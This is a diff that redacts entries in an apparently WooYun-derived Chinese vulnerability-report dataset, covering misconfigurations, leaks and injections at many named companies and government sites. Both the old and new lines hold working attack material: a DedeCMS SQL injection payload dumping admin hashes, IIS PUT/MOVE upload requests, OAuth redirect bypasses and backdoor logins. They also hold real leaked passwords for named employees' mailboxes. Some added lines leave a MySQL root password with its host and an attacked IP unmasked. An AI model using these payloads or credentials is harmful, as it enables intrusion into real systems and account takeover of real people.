 3. 验证漏洞响应
 
-**详情**: 雷神1、入手：域名；：查询信息  查询泄露：394639815@qq.com--------a2430036  常用密码2、尝试登陆mailmail.qq.comhexiaochuan@leishen.cn   a2430036登陆：mail.trzone.cn何啸川 <hexiaochuan@trzone.cn>a2430036这不太好吧。。。ok  为下一步测试做准备
+**详情**: 雷神1、入手：域名；：查询信息  查询泄露：394639815@某互联网公司.com--------a2430036  常用密码2、尝试登陆mailmail.某互联网公司.comhexiaochuan@leishen.cn   a2430036登陆：mail.trzone.cn何啸川 <hexiaochuan@trzone.cn>a2430036这不太好吧。。。ok  为下一步测试做准备
 
 **POC**: ···
 
@@ -2703,7 +2703,7 @@
 
 ---
 ### [wooyun-2011-03248] 阿里某分站目录泄漏
-**厂商**: 阿里巴巴 | **年份**: 2011 | **类型**: 应用配置错误
+**厂商**: 某电商平台 | **年份**: 2011 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -2716,7 +2716,7 @@
 
 **详情**: 目录泄漏
 
-**POC**: http://qa.alibaba.com/wp-content/plugins/wp-postratings/http://qa.alibaba.com/wp-content/plugins/jquery-accordion/http://qa.alibaba.com/wp-content/plugins/nextgen-gallery/http://qa.alibaba.com/wp-content/plugins/nextgen-gallery/http://qa.alibaba.com/wp-content/plugins/tabbed-widgets/http://qa.alibab
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2724,8 +2724,8 @@
 ---
 
 ---
-### [wooyun-2013-041514] 京东商城android客户端缺陷导致欺骗
-**厂商**: 京东商城 | **年份**: 2013 | **类型**: 默认配置不当
+### [wooyun-2013-041514] 某电商平台商城android客户端缺陷导致欺骗
+**厂商**: 某电商平台商城 | **年份**: 2013 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -2736,9 +2736,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 京东商城app中存在<receiver android:name=".broadcastReceiver.CloudMessageReceiver"><intent-filter><action android:name="com.jd.msg" /><action android:name="com.jd.register.action" /></intent-filter></receiver>如果一个app中也有一个receiver有这个<action android:name="com.jd.msg" />然后在receiver中设置Intent intent = new Intent();intent.setAction("com.example.now");intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);startActivity(
+**详情**: 某电商平台商城app中存在<receiver android:name=".broadcastReceiver.CloudMessageReceiver"><intent-filter><action android:name="com.jd.msg" /><action android:name="com.jd.register.action" /></intent-filter></receiver>如果一个app中也有一个receiver有这个<action android:name="com.jd.msg" />然后在receiver中设置Intent intent = new Intent();intent.setAction("com.example.now");intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);startActivity(
 
-**POC**: 当京东商城云端消息到来的时候，就立马切换到如下界面，起到劫持欺骗的作用
+**POC**: 当某电商平台商城云端消息到来的时候，就立马切换到如下界面，起到劫持欺骗的作用
 
 **绕过**: 直接利用
 
@@ -2780,7 +2780,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目测，以下都可以域传送dns1.mailbox-server.comdns2.mailbox-server.comdns3.mailbox-server.comdns4.mailbox-server.com其一：eset.com.cn                              38400    IN    SOAeset.com.cn                              3600     IN    A        58.83.135.47eset.com.cn                              38400    IN    NSeset.com.cn                              38400    IN    NSeset.com.cn                              3
+**详情**: 目测，以下都可以域传送dns1.mailbox-server.comdns2.mailbox-server.comdns3.mailbox-server.comdns4.mailbox-server.com其一：eset.com.cn                              38400    IN    SOAeset.com.cn                              3600     IN    A        [IP已脱敏]eset.com.cn                              38400    IN    NSeset.com.cn                              38400    IN    NSeset.com.cn                              3
 
 **POC**: 4个dns都要设置下。。。
 
@@ -2802,7 +2802,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 随便上个扫网站的工具，没想到扫出个MDB，这年头还有政府网站有这漏洞地址：http://www.sqjrw.cn/_database/5d7525e61ca2ae39.mdb谷歌出的后台不对，看来后台地址已经被改掉了
+**详情**: 随便上个扫网站的工具，没想到扫出个MDB，这年头还有政府网站有这漏洞地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2824,7 +2824,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: DedeCMSV57_UTF8_SP1 系统未升级，存在sql注射http://lvxun.yiqifei.com/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa\%27and+char%28@%60%27%60%29+/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat%280x3C6162633E,group_concat%280x7C,userid,0x3a,pwd,0x7C%29,0x3C2F6162633E%29,5,6,7,8,9%20from%20%60%23@__admin%60%23
+**详情**: DedeCMSV57_UTF8_SP1 系统未升级，存在sql注射https://example.com/[已脱敏]][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa\%27and+char%28@%60%27%60%29+/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat%280x3C6162633E,group_concat%280x7C,userid,0x3a,pwd,0x7C%29,0x3C2F6162633E%29,5,6,7,8,9%20from%20%60%23@__admin%60%23
 
 **POC**: 很可惜，三个MD5都没解出来。。。唉
 
@@ -2846,9 +2846,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 东阿阿胶官方商城http://www.edongeejiao.cn/，直接上传下载任意内容
+**详情**: 东阿阿胶官方商城https://example.com/[已脱敏]
 
-**POC**: ping www.edongeejiao.cn 得到ip, 61.133.117.174 ，用ftp，直接匿名上去，拥有上传，下载权限，如图
+**POC**: ping www.edongeejiao.cn 得到ip, [IP已脱敏] ，用ftp，直接匿名上去，拥有上传，下载权限，如图
 
 **绕过**: 直接利用
 
@@ -2892,7 +2892,7 @@
 
 **详情**: 网神vpn多处默认配置不当的问题
 
-**POC**: 查看网神vpn自带的火墙debug信息:/admin/fw/debug.php查看网神vpn自带的火墙日志信息:/admin/fw/log.phphttps://218.89.188.246https://221.202.118.50
+**POC**: 查看网神vpn自带的火墙debug信息:/admin/fw/debug.php查看网神vpn自带的火墙日志信息:/admin/fw/log.phphttps://[IP已脱敏]https://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -2900,8 +2900,8 @@
 ---
 
 ---
-### [wooyun-2012-07090] 淘宝网服务配置错误导致信息泄漏
-**厂商**: 阿里巴巴 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-07090] 某电商平台网服务配置错误导致信息泄漏
+**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -2912,7 +2912,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://loginlogs.wangwang.taobao.com:8080/up
+**详情**: https://example.com/[已脱敏]
 
 **POC**: CONTENT_LENGTH ''CONTENT_TYPE ''DOCUMENT_ROOT '/home/admin/cai/data/html'HTTP_ACCEPT '*/*'HTTP_ACCEPT_ENCODING 'gzip, deflate'HTTP_ACCEPT_LANGUAGE 'zh-cn'HTTP_CONNECTION 'Keep-Alive'HTTP_COOKIE 'cna=d60bCAUjihwCAecdAHn08GNB; t=e97a424c2774b9b8d29c635121f0f8de; tg=0; _cc_=UtASsssmfA%3D%3D; tracknick=
 
@@ -2936,7 +2936,7 @@
 
 **详情**: 慧眼高级版管理模块作为一种集成解决方案运行于服务器系统上，并集成了嵌入式操作系统。该操作系统是独立于服务器操作系统之外的，可以为服务器提供一整套完整、稳定、有效的解决方案。作为系统管理员，你可以在任意时间，任意地点响应服务器所发生的紧急故障并可以通过网络远程对服务器进行相应的操控。为什么疑似后门呢？因为正常账号能通过登录平台能正常显示出来，而该账号却隐藏无显示无法修改。测试时发现存在两个后门账号，分别是lenovo/lenovo和three/three
 
-**POC**: 案例:http://cj.xixiedu.com/login.htmlhttp://www.tlxedu.gov.cn/login.htmlhttp://218.192.99.57/login.htmlhttp://60.207.0.56/login.htmlhttp://tlxedun.com/login.html
+**POC**: 案例:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2956,7 +2956,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: model-N100Rv2添加：model-N200Rv2（经测试同样受影响）http://地址:8080/cgi-bin/saveconf（输入地址无视密码连续点击四下确定或取消）可进行“Reset Settings to Default”或“System Reboot”等操作。案例：http://222.90.29.144:8080/cgi-bin/saveconf不要随意测试点击哦，亲。
+**详情**: model-N100Rv2添加：model-N200Rv2（经测试同样受影响）http://地址:8080/cgi-bin/saveconf（输入地址无视密码连续点击四下确定或取消）可进行“Reset Settings to Default”或“System Reboot”等操作。案例：http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -2978,13 +2978,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 买买茶 58.59.2.25 MongoDB 配置不当
+**详情**: 买买茶 [IP已脱敏] MongoDB 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 启用 auth 指定IP访问请参照 http://www.oschina.net/translate/10-tips-improve-mongodb
+**修复**: 启用 auth 指定IP访问请参照 https://example.com/[已脱敏]
 ---
 
 ---
@@ -3000,7 +3000,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: POST /index.php/openapi/pam_callback/login/module/pam_passport_basic/type/shopadmin/appid/desktop/redirect/aHR0cDovL29pbS5sYWl5aWZlbi5jb20vaW5kZXgucGhwLw%3D%3D HTTP/1.1Host: oim.laiyifen.comProxy-Connection: keep-aliveContent-Length: 27Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://oim.laiyifen.comUser-Agent: Mozilla/5.0 (Wi
+**详情**: POST /index.php/openapi/pam_callback/login/module/pam_passport_basic/type/shopadmin/appid/desktop/redirect/aHR0cDovL29pbS5sYWl5aWZlbi5jb20vaW5kZXgucGhwLw%3D%3D HTTP/1.1Host: oim.laiyifen.comProxy-Connection: keep-aliveContent-Length: 27Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] Mozilla/5.0 (Wi
 
 **POC**: POST /index.php/openapi/pam_callback/login/module/pam_passport_basic/type/shopadmin/appid/desktop/redirect/aHR0cDovL29pbS5sYWl5aWZlbi5jb20vaW5kZXgucGhwLw%3D%3D HTTP/1.1Host: oim.laiyifen.comProxy-Connection: keep-aliveContent-Length: 27Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,
 
@@ -3022,9 +3022,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:http://mail.miit.gov.cn:8080/login.php?F_authid=打开
+**详情**: inurl:https://example.com/[已脱敏]
 
-**POC**: http://mail.miit.gov.cn:8080/login.php?F_authid=emh1amlhamlhQG1paXQuZ292LmNuJjIwMTUtMDItMDEmNTRjNzU0MTdjMTQ3ZTM2YWY1ZTYyZWUzZmNjZDZhNWU=
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3046,7 +3046,7 @@
 
 **详情**: 
 
-**POC**: rsync 220.181.67.131::mail_class.php<?php/**** 每天检查一下前一天异常的情况*/require(dirname(__FILE__) . '/log.php' );require(dirname(__FILE__) . '/mail_class.php' );date_default_timezone_set('Asia/Chongqing');require(dirname(__FILE__). "/PHPMailer/class.phpmailer.php");runlog();ob_start();$tmp = read_data_from_d
+**POC**: rsync [IP已脱敏]::mail_class.php<?php/**** 每天检查一下前一天异常的情况*/require(dirname(__FILE__) . '/log.php' );require(dirname(__FILE__) . '/mail_class.php' );date_default_timezone_set('Asia/Chongqing');require(dirname(__FILE__). "/PHPMailer/class.phpmailer.php");runlog();ob_start();$tmp = read_data_from_d
 
 **绕过**: 直接利用
 
@@ -3076,8 +3076,8 @@
 ---
 
 ---
-### [wooyun-2012-09488] 阿里巴巴某站nginx解析漏洞
-**厂商**: 阿里巴巴 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-09488] 某电商平台某站nginx解析漏洞
+**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -3088,9 +3088,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: this site:http://ued.alimama.com/
+**详情**: this site:https://example.com/[已脱敏]
 
-**POC**: http://ued.alimama.com/wp-content/themes/sandbox/images/med_logo.gif/c.phplook:
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3110,7 +3110,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站整站泄露：http://www.wzu.edu.cn/bf.rar为ASPX
+**详情**: 网站整站泄露：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3132,7 +3132,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://218.106.133.55/Login.aspx?userRequest=http%3a%2f%2f218.106.133.55%2fdefault.aspx进出口部业务管理系统（IED）－TCL集团股份有限公司系统存在IIS写权限漏洞，导致直接上传可执行文件PUT /test.txt HTTP/1.1host: 218.106.133.55Content-Length: 4testMOVE /test.txt HTTP/1.1host: 218.106.133.55Destination:http://218.106.133.55/iistest.asp
+**详情**: http://[IP已脱敏] /test.txt HTTP/1.1host: [IP已脱敏]Content-Length: 4testMOVE /test.txt HTTP/1.1host: [IP已脱敏]Destination:http://[IP已脱敏]
 
 **POC**: 看了一下，发现上面早有人检测过了
 
@@ -3142,7 +3142,7 @@
 ---
 
 ---
-### [wooyun-2015-0110056] 盛大某网站配置错误导致泄露源码（疑似影响微信公众平台KEY）
+### [wooyun-2015-0110056] 盛大某网站配置错误导致泄露源码（疑似影响某互联网公司公众平台KEY）
 **厂商**: 盛大网络 | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
@@ -3154,7 +3154,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://sv.sdo.com
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3176,9 +3176,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://caipan.yokagames.com/index/search  这里，随便查询一下就出来了
+**详情**: https://example.com/[已脱敏]  这里，随便查询一下就出来了
 
-**POC**: http://caipan.yokagames.com/index/search  这里，随便查询一下就出来了
+**POC**: https://example.com/[已脱敏]  这里，随便查询一下就出来了
 
 **绕过**: 直接利用
 
@@ -3198,7 +3198,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 开始还以为是盛大的，结果把配置文件下下来看了下 原来是边锋的。。http://61.152.103.29/
+**详情**: 开始还以为是盛大的，结果把配置文件下下来看了下 原来是边锋的。。http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -3264,7 +3264,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: rsync 219.232.240.2::case没有身份认证导致文件外泄，又从这些文件中找到如下数据库权限，数据库授权不严格，导致任意ip在有用户名密码情况下连接，且权利很高。掌趣科技mysql  -uroot -pmysql228 -h219.232.240.6| analyze             || android             || bbs                 || cjsh_user           || cms                 || dx                  || football            || game_stat           || game_stat_test      || gcenter             || gs                  || lt_wap      
+**详情**: rsync [IP已脱敏]::case没有身份认证导致文件外泄，又从这些文件中找到如下数据库权限，数据库授权不严格，导致任意ip在有用户名密码情况下连接，且权利很高。掌趣科技mysql  -uroot -pmysql228 -h219.232.240.6| analyze             || android             || bbs                 || cjsh_user           || cms                 || dx                  || football            || game_stat           || game_stat_test      || gcenter             || gs                  || lt_wap      
 
 **POC**: 掌趣科技mysql  -uroot -pmysql228 -h219.232.240.6| analyze             || android             || bbs                 || cjsh_user           || cms                 || dx                  || football            || game_stat           || game_stat_test      || gcenter             || gs                  || l
 
@@ -3286,7 +3286,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://demo.cmseasy.cn/99/index.php?case=archive&act=search还是这里的问题搜索http://demo.cmseasy.cn/99/index.php?case=archive&act=searchhttp://demo.cmseasy.cn/99/index.php?case=archive&act=searchhttp://demo.cmseasy.cn/99/index.php?case=archive&act=searchhttp://demo.cmseasy.cn/99/index.php?case=archive&act=searchhttp://demo.cmseasy.cn/99/index.php?case=archive&act=searchhttp://demo.cmseasy.cn/99/index.php?c
+**详情**: https://example.com/[已脱敏]
 
 **POC**: Warning: file_put_contents(E:\clientweb\Cmsdemo\wwwroot\99/data/hotsearch/http%3A%2F%2Fdemo.cmseasy.cn%2F99%2Findex.php%3Fcase%3Darchive%26act%3Dsearchhttp%3A%2F%2Fdemo.cmseasy.cn%2F99%2Findex.php%3Fcase%3Darchive%26act%3Dsearchhttp%3A%2F%2Fdemo.cmseasy.cn%2F99%2Findex.php%3Fcase%3Darchive%26act%3Ds
 
@@ -3308,7 +3308,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 偶然发现之前测试的某服务器在壹基金服务器的c段..于是测试了一下，绝无恶意。先ping下壹基金的ipip地址为：116.204.96.234通过c段某服务器可对116.204.96.234进行arp攻击，可断网。可以看出arp攻击时已经断网了前一秒下一秒测试时间非常短，希望此次测试未给网站造成影响。真的没有恶意
+**详情**: 偶然发现之前测试的某服务器在壹基金服务器的c段..于是测试了一下，绝无恶意。先ping下壹基金的ipip地址为：[IP已脱敏]通过c段某服务器可对116.204.96.234进行arp攻击，可断网。可以看出arp攻击时已经断网了前一秒下一秒测试时间非常短，希望此次测试未给网站造成影响。真的没有恶意
 
 **POC**: 见详细说明。
 
@@ -3374,7 +3374,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 数据有风险1.http://www.cqpost.com/siteserver/Installer/default.aspx2.http://www.fhplan.gov.cn/siteserver/Installer/default.aspx3.http://www.hfxzzx.gov.cn/sscms/siteserver/Installer/default.aspx4.http://www.wnmc.edu.cn/siteserver/Installer/Default.aspx5.http://www.ahlxcdc.com/siteserver/Installer/Access.aspx6.http://nanolab.pku.edu.cn/siteserver/Installer/default.aspx7.http://www.qfnujiuye.com/siteserve
+**详情**: 数据有风险1.https://example.com/[已脱敏]
 
 **POC**: 重庆邮政
 
@@ -3396,7 +3396,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://218.76.27.30:8080/
+**详情**: 地址：http://[IP已脱敏]
 
 **POC**: 挖掘机的铲子指着上面↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
 
@@ -3406,8 +3406,8 @@
 ---
 
 ---
-### [wooyun-2014-059639] 腾讯OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取（三）
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 应用配置错误
+### [wooyun-2014-059639] 某互联网公司OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取（三）
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -3418,9 +3418,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯OAuth平台对redirect_uri校验时, 未考虑一些奇怪的浏览器特性, 导致redirect_uri检验被绕过.safari会对url中的full width字符自动转化为常见的字符, 比如下面这个url:http://ｗｗｗ．ｗｏｏｙｕｎ．ｏｒｇ会跳转到http://www.wooyun.org那么同样的, 把/#?这类path和authority分割的字符 转化为full width字符后, 虽然服务器认为这样的字符已经不能分割authority了,  但在浏览器处理时, 依然进行了分割.
+**详情**: 某互联网公司OAuth平台对redirect_uri校验时, 未考虑一些奇怪的浏览器特性, 导致redirect_uri检验被绕过.safari会对url中的full width字符自动转化为常见的字符, 比如下面这个url:http://ｗｗｗ．ｗｏｏｙｕｎ．ｏｒｇ会跳转到https://example.com/[已脱敏] 把/#?这类path和authority分割的字符 转化为full width字符后, 虽然服务器认为这样的字符已经不能分割authority了,  但在浏览器处理时, 依然进行了分割.
 
-**POC**: http://openapi.qzone.qq.com/oauth/show?which=Login&display=pc&response_type=code&client_id=100263567&redirect_uri=http://www.aaaa.com／.security.tencent.com/2.php&scope=get_user_info,add_pic_t,add_t
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -3462,7 +3462,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: duang~~~问题是这这样的.由于服务配置出现问题，日志访问都可以看到http://www.gotohuawei.com/admin/Runtime/Logs/点击日志看看，哇塞，挺精彩的！[ 2013-12-13T00:09:38+08:00 ] SQL: SHOW COLUMNS FROM `sm_manager` [ RunTime:0.000803s ][ 2013-12-13T00:09:38+08:00 ] SQL: SELECT * FROM `sm_manager` WHERE ( `username` = 'adminsm' ) AND ( `passwd` = '07ca10b4bfa95df9d505cb19b6ac5125' ) LIMIT 1  [ RunTime:0.000194s ]哇塞，调试啊！拿07ca10b4bfa95df9d505cb19b6ac51
+**详情**: duang~~~问题是这这样的.由于服务配置出现问题，日志访问都可以看到https://example.com/[已脱敏] 2013-12-13T00:09:38+08:00 ] SQL: SHOW COLUMNS FROM `sm_manager` [ RunTime:0.000803s ][ 2013-12-13T00:09:38+08:00 ] SQL: SELECT * FROM `sm_manager` WHERE ( `username` = 'adminsm' ) AND ( `passwd` = '07ca10b4bfa95df9d505cb19b6ac5125' ) LIMIT 1  [ RunTime:0.000194s ]哇塞，调试啊！拿07ca10b4bfa95df9d505cb19b6ac51
 
 **POC**: 同上
 
@@ -3484,7 +3484,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 云测信息https://mail.itestin.com  itestin.comsupport@itestin.com   testIn_ihttps://exmail.qq.comservice@mtestin.com mtestin123wangziting@mtestin.com mtestin123pay@mtestin.com mtestin123ok
+**详情**: 云测信息https://example.com/[已脱敏]  itestin.comsupport@itestin.com   testIn_ihttps://example.com/[已脱敏] mtestin123wangziting@mtestin.com mtestin123pay@mtestin.com mtestin123ok
 
 **POC**: ···
 
@@ -3506,7 +3506,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 36氪1、本来是准备完整测试的，后来发现没有vpn，并且：Hi，all，近期总有人在恶意尝试咱们员工的邮箱密码。请大家要注意保护好自己的邮箱，一旦被人攻入，后果可能非常严重。尤其是合伙人、人力、财务、技术部的同学，要特别小心。在此，我给大家一些能有效提升安全性的小技巧，也欢迎大家贡献其他好点子。安全都来没小事儿，需要大伙齐上阵。1、在可信的主机上使用邮箱。避免在机场、网吧的公用主机上使用。2、在可信的网络环境中使用邮箱。避免使用商场、公交的免费wifi或蹭网。3、使用相当复杂的密码，例如我使用密码会形如：6^5qaXQr9G`tP。每个账号都是用不同的密码。4、使用工具管理密码，比如KeePass、OnePass。但不要使用自带具有网络同步功能的密码管理工具。5、周期性的变更密码6、对于QQ邮箱，绑定微信，启用微信动态密码+信任计算机的方式哗哗哗 过个节回来微信验证都开了  悲剧  提交之
+**详情**: 36氪1、本来是准备完整测试的，后来发现没有vpn，并且：Hi，all，近期总有人在恶意尝试咱们员工的邮箱密码。请大家要注意保护好自己的邮箱，一旦被人攻入，后果可能非常严重。尤其是合伙人、人力、财务、技术部的同学，要特别小心。在此，我给大家一些能有效提升安全性的小技巧，也欢迎大家贡献其他好点子。安全都来没小事儿，需要大伙齐上阵。1、在可信的主机上使用邮箱。避免在机场、网吧的公用主机上使用。2、在可信的网络环境中使用邮箱。避免使用商场、公交的免费wifi或蹭网。3、使用相当复杂的密码，例如我使用密码会形如：6^5qaXQr9G`tP。每个账号都是用不同的密码。4、使用工具管理密码，比如KeePass、OnePass。但不要使用自带具有网络同步功能的密码管理工具。5、周期性的变更密码6、对于某互联网公司邮箱，绑定某互联网公司，启用某互联网公司动态密码+信任计算机的方式哗哗哗 过个节回来某互联网公司验证都开了  悲剧  提交之
 
 **POC**: ···
 
@@ -3516,8 +3516,8 @@
 ---
 
 ---
-### [wooyun-2014-059613] 百度OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取
-**厂商**: 百度 | **年份**: 2014 | **类型**: 应用配置错误
+### [wooyun-2014-059613] 某搜索引擎OAuth平台redirect_uri过滤不严可能导致用户信息遭窃取
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -3530,11 +3530,11 @@
 
 **详情**: 回调URL的域名验证可以被\绕过
 
-**POC**: http://openapi.baidu.com/oauth/2.0/authorize?response_type=code&client_id=RCKbWANx8KewnXs9rwGWFtZV&redirect_uri=http://www.abc.com\.oauth.qunar.com/oauth-client/baidu/login
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
-**修复**: 对于WooYun: 绕过百度OAuth2.0认证的redirect_uri限制劫持帐号token的厂商评论不敢苟同, 你们仅仅是从server端的角度来考虑这个漏洞的危害, 但忽略了client端由于你们对回调URL过滤不严而产生的威胁. 具体例子可以看http://zhuanlan.zhihu.c
+**修复**: 对于WooYun: 绕过某搜索引擎OAuth2.0认证的redirect_uri限制劫持帐号token的厂商评论不敢苟同, 你们仅仅是从server端的角度来考虑这个漏洞的危害, 但忽略了client端由于你们对回调URL过滤不严而产生的威胁. 具体例子可以看https://example.com/[已脱敏]
 ---
 
 ---
@@ -3550,7 +3550,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 连连银通找到一个员工https://github.com/djh4230/MailWebLogin/blob/b8d0607c88536907374600f347e24682680812f9/MailLogin/src/com/mo9/CreditCenterCraw.javahttps://github.com/djh4230大数据泄露检索：wan423016	djh4230@126.com	 djh423016https://mail.lianlian.com/owa/dengjh  djh423016然后：...等等等
+**详情**: 连连银通找到一个员工https://example.com/[已脱敏]	djh4230@126.com	 djh423016https://example.com/[已脱敏]  djh423016然后：...等等等
 
 **POC**: ···
 
@@ -3572,7 +3572,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 华图教育备份数据库泄露rsync 泄露，密码为空rsync 211.151.49.23::rsync
+**详情**: 华图教育备份数据库泄露rsync 泄露，密码为空rsync [IP已脱敏]::rsync
 
 **POC**: (见原文)
 
@@ -3596,7 +3596,7 @@
 
 **详情**: 
 
-**POC**: 剑心大牛想看热闹...那么来一碟花生米..慢慢看本次目标 新华基金网1. 找准目标www.ncfund.com.cn  解析IP  发现什么不对换个姿势...找交易登陆的地方会有好戏trade.ncfund.com.cn   换来IP：124.162.20.50接着开始C段...会有惊喜http://124.162.20.54/console/  弱口令事件  微信平台确认厂商：http://124.162.20.54/weixin-gxt/不用怀疑就是新华基金2. shell： http://124.162.20.54/weisvr/jmxroot.jsp360butian进入服务器后才发现
+**POC**: 剑心大牛想看热闹...那么来一碟花生米..慢慢看本次目标 新华基金网1. 找准目标www.ncfund.com.cn  解析IP  发现什么不对换个姿势...找交易登陆的地方会有好戏trade.ncfund.com.cn   换来IP：[IP已脱敏]接着开始C段...会有惊喜http://[IP已脱敏]  弱口令事件  某互联网公司平台确认厂商：http://[IP已脱敏] shell： http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -3638,9 +3638,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://travel.haier.com/travel/Hotel/SPHotelInfo/ChangePwd.aspx直接点获取供应商密码，依次类推
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://travel.haier.com/travel/Hotel/SPHotelInfo/ChangePwd.aspx
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3660,7 +3660,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 源码存放在根目录http://www.gzjinsha.gov.cn/wwwroot.rar下载下来发现为某cms开发的。找配置文件，发现密码于是找后台http://www.gzjinsha.gov.cn/index.php?m=admin登录成功。
+**详情**: 源码存放在根目录https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3682,7 +3682,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://125.88.6.227/invoker/EJBInvokerServletinvoker/EJBInvokerServlet未删除，且认证用户密码为admin。
+**详情**: http://[IP已脱敏]
 
 **POC**: 部署war包未成功，估计有拦截。
 
@@ -3750,7 +3750,7 @@
 
 **详情**: 二级目录有论坛 有“faq”可以传图片？
 
-**POC**: http://pcdoctor.kingsoft.com/style.css/.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3772,7 +3772,7 @@
 
 **详情**: 首都机场某c段存在JBoss侧漏可以用jboss后台做很多淫荡的事情。
 
-**POC**: http://219.143.16.151:8081/login 机场wifi后台http://219.143.16.152:8080/jmx-console/HtmlAdaptor?action=displayMBeans jboss
+**POC**: http://[IP已脱敏] 机场wifi后台http://[IP已脱敏] jboss
 
 **绕过**: 直接利用
 
@@ -3816,7 +3816,7 @@
 
 **详情**: 南昌商务网存在漏洞由于ftp服务器配置不当导致系统盘溢出，任意文件操作
 
-**POC**: 南昌商务网存在漏洞由于ftp服务器配置不当导致系统盘溢出，任意文件操作域名：http://smw.nc.gov.cn/ftp://smw.nc.gov.cn帐号：nc密码：nc可在启动项内放置后门脚本，当服务器重启时，自动运行
+**POC**: 南昌商务网存在漏洞由于ftp服务器配置不当导致系统盘溢出，任意文件操作域名：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3824,8 +3824,8 @@
 ---
 
 ---
-### [wooyun-2011-02557] 新浪某分站缓存泄露
-**厂商**: 新浪 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-02557] 某社交平台某分站缓存泄露
+**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -3860,7 +3860,7 @@
 
